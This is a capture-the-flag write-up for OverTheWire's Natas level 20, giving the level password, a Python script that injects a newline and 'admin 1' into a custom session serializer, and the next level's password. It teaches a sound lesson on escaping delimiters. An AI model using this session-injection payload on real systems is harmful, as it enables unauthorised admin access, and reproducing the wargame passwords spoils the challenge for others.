# Natas Level 20 to 21

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 20 -> 21 |
| Status | Complete |

## Objective

Abuse a custom session serializer to set `admin` to `1`.

## Given Access

User: `natas20`

Password:

```text
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```

## Method

The custom session writer saves each key-value pair as `key value\n`, and the reader splits each line on the first space. Submit a name containing a newline followed by `admin 1`, causing the next read to load an injected admin session key.

## Commands

```python
import requests

url = "http://natas20.natas.labs.overthewire.org/"
auth = ("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")

s = requests.Session()
s.auth = auth
s.post(url, data={"name": "codex\nadmin 1"}, timeout=10)
r = s.get(url, timeout=10)
print(r.text)
```

## Result

Password for `natas21`:

```text
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

## Lesson

Line-based serialization must escape delimiters. Otherwise, user-controlled newlines can inject additional session keys.

## References

- https://overthewire.org/wargames/natas/
